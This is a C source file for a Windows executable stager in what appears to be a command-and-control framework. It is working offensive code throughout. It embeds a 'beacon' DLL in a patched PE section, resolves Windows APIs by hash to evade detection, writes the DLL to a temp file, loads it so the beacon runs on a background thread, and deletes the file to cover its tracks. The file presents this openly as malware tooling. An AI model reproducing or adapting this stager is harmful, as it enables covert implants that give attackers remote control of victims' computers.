// beacon-stub.exe — EXE stager template.
//
// artifact-gen patches the .co2pay section with [magic(8)][size(4)][DLL bytes].
// At runtime: write DLL to a temp file, LoadLibrary it, delete the file,
// then sleep while beacon runs on its own thread.
//
// All imports from kernel32 only — no CRT dependency.

#include <windows.h>
#include "../api_hash.h"

#define MAX_PAYLOAD (512 * 1024)

// Sentinel magic as a 64-bit LE integer: "CO2HPAYL"
#define MAGIC_U64 0x4C59415048324F43ULL

#pragma section(".co2pay", read)
__declspec(allocate(".co2pay"))
static const unsigned char g_payload[MAX_PAYLOAD + 12] = {
    'C','O','2','H','P','A','Y','L', /* magic */
    0,0,0,0,                          /* size (patched by artifact-gen) */
    /* [12 .. MAX_PAYLOAD+11]: beacon DLL bytes, zero-padded */
};

void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();

    /* Verify magic */
    if (*(unsigned long long *)g_payload != MAGIC_U64) ExitProcess(1);

    unsigned int dll_size = *(unsigned int *)(g_payload + 8);
    if (!dll_size || dll_size > MAX_PAYLOAD) ExitProcess(1);

    const unsigned char *dll_bytes = g_payload + 12;

    /* Write DLL to a temp file */
    wchar_t tmpdir[MAX_PATH + 1];
    wchar_t tmppath[MAX_PATH + 1];
    GetTempPathW(MAX_PATH, tmpdir);
    GetTempFileNameW(tmpdir, L"c2h", 0, tmppath); /* creates unique .tmp file */

    HANDLE hf = CreateFileW(tmppath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) ExitProcess(1);

    DWORD written = 0;
    WriteFile(hf, dll_bytes, dll_size, &written, NULL);
    CloseHandle(hf);

    if (written != dll_size) {
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    /* Load the DLL — DllEntry spawns the beacon thread */
    HMODULE mod = LoadLibraryW(tmppath);
    if (!mod) {
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    /* The DLL is mapped; it's safe to delete the on-disk copy */
    DeleteFileW(tmppath);

    /* Yield main thread; beacon runs on its own thread */
    Sleep(INFINITE);
    ExitProcess(0);
}
